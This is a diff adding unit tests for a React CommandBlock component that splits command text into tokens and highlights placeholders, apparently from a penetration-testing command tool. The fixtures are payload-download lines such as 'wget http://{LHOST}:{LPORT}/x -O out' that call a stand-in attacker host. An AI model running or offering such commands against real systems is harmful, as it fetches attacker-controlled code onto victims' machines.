@@ -121,3 +121,22 @@ describe("PickerTrigger", () => {
     expect(screen.queryByText("Pick one")).not.toBeInTheDocument();
   });
 });
+
+describe("CommandBlock placeholders inside a token", () => {
+  it("keeps a token with a placeholder in one nowrap span and marks only the placeholder", () => {
+    const { container } = render(<CommandBlock text="wget http://{LHOST}:{LPORT}/x -O out" placeholders />);
+    const tokens = [...container.querySelectorAll("[data-token]")];
+    expect(tokens.map((t) => t.textContent)).toEqual(["wget", "http://{LHOST}:{LPORT}/x", "-O", "out"]);
+    expect(tokens[1]).toHaveClass("whitespace-nowrap");
+    const marked = [...tokens[1].querySelectorAll("mark")].map((m) => m.textContent);
+    expect(marked).toEqual(["{LHOST}", "{LPORT}"]);
+    expect(container.querySelector("code")!.textContent).toBe("wget http://{LHOST}:{LPORT}/x -O out");
+  });
+
+  it("marks explicit unresolved tokens inside their word", () => {
+    const { container } = render(<CommandBlock text="curl http://LHOST/x" tokens={["LHOST"]} />);
+    const word = [...container.querySelectorAll("[data-token]")][1];
+    expect(word.textContent).toBe("http://LHOST/x");
+    expect([...word.querySelectorAll("mark")].map((m) => m.textContent)).toEqual(["LHOST"]);
+  });
+});
